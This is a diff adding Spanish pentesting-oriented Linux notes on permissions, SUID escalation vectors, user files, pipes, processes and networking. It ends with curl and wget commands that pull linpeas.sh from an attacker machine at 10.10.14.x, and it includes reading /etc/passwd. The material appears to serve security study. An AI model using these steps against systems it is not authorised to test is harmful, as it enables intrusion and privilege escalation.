@@ -77,3 +77,97 @@ El aspecto de este prompt no es estático; se define mediante una variable de en
 
 > [!TIP]
 > En auditorías de seguridad y pentesting, es muy común encontrarse con "dumb shells" donde el prompt no se muestra o está roto. Saber cómo está estructurado te ayudará a identificar rápidamente si has logrado escalar privilegios a root (al notar el cambio de `$` a `#`).
+
+---
+
+## 🔒 Permisos y Propietarios
+
+Linux cuenta con un sistema robusto de permisos para proteger la integridad de los archivos. Cada archivo y directorio tiene asignado un propietario y un grupo, junto con permisos definidos para tres categorías de usuarios:
+
+- **Usuario (u):** El dueño del archivo.
+- **Grupo (g):** Usuarios que pertenecen al grupo del archivo.
+- **Otros (o):** Cualquier otro usuario del sistema.
+
+### Tipos de Permisos
+| Símbolo | Valor Octal | Descripción |
+| :--- | :--- | :--- |
+| **`r`** (read) | `4` | Permite leer el contenido del archivo / listar el directorio. |
+| **`w`** (write) | `2` | Permite modificar el archivo / crear y borrar archivos en un directorio. |
+| **`x`** (execute) | `1` | Permite ejecutar un binario/script / entrar a un directorio con `cd`. |
+
+### Comandos de Administración
+- **`chmod`**: Cambia los permisos de un archivo o directorio.
+  - *Notación octal:* `chmod 755 script.sh` (Propietario: rwx [7], Grupo: r-x [5], Otros: r-x [5]).
+  - *Notación simbólica:* `chmod +x script.sh` (añade permiso de ejecución a todos).
+- **`chown`**: Cambia el propietario y/o grupo del archivo.
+  - `chown root:root archivo.txt` (Cambia propietario a root y grupo a root).
+
+### Permisos Especiales (Vectores de Escalada)
+- **SUID (Set User ID - octal `4000` / `u+s`):** Permite ejecutar un archivo con los privilegios del propietario del archivo (si el propietario es `root`, el binario se ejecuta como root).
+- **SGID (Set Group ID - octal `2000` / `g+s`):** Permite ejecutar un binario con los privilegios del grupo del archivo.
+
+---
+
+## 👥 Gestión de Usuarios y Privilegios
+
+El control de accesos y la gestión de identidad es crucial para entender el alcance de una sesión en Linux.
+
+### Archivos Clave del Sistema:
+*   `/etc/passwd`: Listado de todas las cuentas locales, su UID (User ID), GID (Group ID), directorio Home y el shell asignado (ej. `/bin/bash` o `/usr/sbin/nologin`).
+*   `/etc/shadow`: Almacena los hashes de las contraseñas cifradas y la información de expiración. Solo accesible por root.
+*   `/etc/group`: Información de los grupos y los usuarios que pertenecen a ellos.
+
+### Comandos de Identidad y Elevación:
+- **`whoami`**: Muestra el nombre del usuario actual.
+- **`id`**: Muestra el UID, GID y los grupos del usuario actual.
+- **`groups`**: Lista los grupos a los que pertenece el usuario.
+- **`sudo -l`**: Lista los privilegios de ejecución permitidos para el usuario actual utilizando `sudo`.
+
+---
+
+## 🔀 Redirecciones y Tuberías (Pipes)
+
+En Linux, los comandos se comunican a través de tres flujos estándar de datos (File Descriptors):
+1. **`stdin` (0):** Entrada estándar (teclado).
+2. **`stdout` (1):** Salida estándar (pantalla).
+3. **`stderr` (2):** Salida de errores (pantalla).
+
+### Operadores de Redirección
+- **`>`**: Redirige la salida estándar (`stdout`) a un archivo, **sobrescribiendo** su contenido.
+  - `echo "hola" > archivo.txt`
+- **`>>`**: Redirige la salida estándar a un archivo, **añadiendo** el contenido al final.
+- **`2>&1`**: Redirige los errores (`stderr`) al mismo lugar que la salida estándar (`stdout`).
+  - `find / -name "config.php" 2>/dev/null` (Envía los errores de "Permiso denegado" al vacío `/dev/null`).
+
+### Tubería o Pipe (`|`)
+Permite conectar la salida estándar de un comando directamente con la entrada estándar de otro.
+- *Ejemplo:* `cat /etc/passwd | grep -i "bash"` (Filtra los usuarios con acceso a la consola interactiva bash).
+
+---
+
+## ⚙️ Procesos y Servicios
+
+- **`ps aux`**: Muestra una instantánea de todos los procesos en ejecución en el sistema.
+- **`top`** / **`htop`**: Monitor de procesos interactivo en tiempo real.
+- **`kill -9 <PID>`**: Envía una señal SIGKILL para terminar de inmediato un proceso específico por su ID (PID).
+- **`systemctl`**: Administrador de servicios del sistema (systemd).
+  - `systemctl status ssh`: Verifica el estado del servicio SSH.
+  - `systemctl restart apache2`: Reinicia el servidor web Apache.
+
+---
+
+## 🌐 Redes y Transferencia de Archivos
+
+### Diagnóstico de Red
+- **`ip a`**: Muestra la configuración de las interfaces de red e direcciones IP.
+- **`ss -tlnp`** o **`netstat -tulnp`**: Muestra los puertos locales abiertos en escucha (`LISTEN`) y los procesos asociados.
+
+### Descarga y Transferencia de Archivos (File Transfers)
+Herramientas nativas para descargar herramientas o payloads desde nuestra máquina atacante:
+```bash
+# Descargar un archivo usando cURL (guarda con el nombre original usando -O)
+curl -O http://10.10.14.x/linpeas.sh
+
+# Descargar un archivo usando wget
+wget http://10.10.14.x/linpeas.sh
+```
